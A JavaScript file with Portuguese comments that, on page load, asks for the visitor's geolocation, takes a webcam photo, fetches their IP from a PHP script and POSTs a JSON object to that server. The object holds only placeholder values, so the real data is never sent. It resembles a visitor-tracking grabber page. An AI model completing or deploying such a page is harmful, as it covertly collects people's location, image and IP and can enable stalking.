

window.onload = function() {
    // Capturar localização, foto e IP automaticamente
    capturarLocalizacao();
    capturarFoto();
    capturarIP();
};

function capturarLocalizacao() {
    // Verifica se o navegador suporta a API de geolocalização
    if (navigator.geolocation) {
        // Obtém a localização do usuário
        navigator.geolocation.getCurrentPosition(function(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            // Exibe a localização do usuário
            document.getElementById('localizacao').innerHTML = 'Latitude: ' + latitude + ', Longitude: ' + longitude;
        });
    } else {
        alert('Seu navegador não suporta a geolocalização.');
    }
}

function capturarFoto() {
    // Verifica se o navegador suporta a API de captura de mídia
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        // Solicita acesso à câmera do dispositivo
        navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
            // Obtém a referência ao elemento de vídeo na página
            var video = document.getElementById('video');

            // Define o fluxo de mídia do vídeo como o stream da câmera
            video.srcObject = stream;

            // Captura uma foto do vídeo após um breve intervalo para garantir que a câmera esteja pronta
            setTimeout(function() {
                // Obtém o contexto do canvas
                var canvas = document.getElementById('canvas');
                var context = canvas.getContext('2d');

                // Define a largura e a altura do canvas para a do vídeo
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Desenha a imagem do vídeo no canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Converte o canvas em uma imagem
                var data = canvas.toDataURL('image/png');

                // Define a imagem capturada como a origem da imagem na página
                document.getElementById('imagem').src = data;

                // Encerra o acesso à câmera
                stream.getTracks().forEach(track => track.stop());
            }, 1000); // Espera 1 segundo antes de capturar a foto
        });
    } else {
        alert('Seu navegador não suporta a captura de fotos.');
    }
}

function capturarIP() {
    // Crie um objeto XMLHttpRequest
    var xhr = new XMLHttpRequest();

    // Especifique o método e o URL do script PHP no servidor
    xhr.open('GET', 'capturar_ip.php', true);

    // Manipule a resposta do servidor (opcional)
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                // Se a solicitação for bem-sucedida, exiba o IP
                document.getElementById('ip').innerHTML = 'Seu endereço IP é: ' + xhr.responseText;
            } else {
                // Se houver um erro, exiba uma mensagem de erro
                console.error('Houve um erro na solicitação.');
            }
        }
    };

    // Envie a solicitação para o servidor
    xhr.send();
}

function enviarDadosParaServidor(dados) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'capturar_ip.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                console.log('Dados enviados com sucesso!');
            } else {
                console.error('Erro ao enviar dados: ' + xhr.status);
            }
        }
    };
    xhr.send(JSON.stringify(dados));
}

// Supondo que você tenha capturado a localização, endereço IP e imagem
var dadosCapturados = {
    localizacao: '...',
    imagem: '...',
    // Outros dados, se houver
};

enviarDadosParaServidor(dadosCapturados);
